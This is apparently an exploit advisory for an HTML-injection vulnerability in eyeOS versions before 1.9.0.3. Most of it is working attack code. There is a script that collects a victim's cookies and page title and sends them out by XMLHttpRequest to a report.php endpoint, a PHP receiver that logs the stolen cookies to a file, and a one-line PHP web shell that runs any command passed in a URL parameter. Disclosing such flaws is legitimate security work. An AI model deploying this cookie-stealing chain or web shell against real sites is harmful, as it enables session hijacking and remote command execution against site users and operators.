eyeOS is prone to an HTML-injection vulnerability because it fails to properly sanitize user-supplied input passed through image content before using it in dynamically generated content.

Attacker-supplied HTML and script code would run in the context of the affected site, potentially allowing an attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user; other attacks are also possible.

Versions prior to eyeOS 1.9.0.3 are vulnerable.

<!doctype html>
<script>
var http = new XMLHttpRequest()
var url = "http://localhost/report.php?" + "user=" + top.document.title + "&cookie=" + document.cookie;
http.open("GET", url, true);
http.send("");
</script>

<?php
$usercookies = fopen("usercookies", "a");
fwrite($usercookies, "User: " . $_GET['user'] . "\t" ."Cookie: " . $_GET['cookie'] . "\n");
?>

<?php
system($_GET['cmd']);
?>
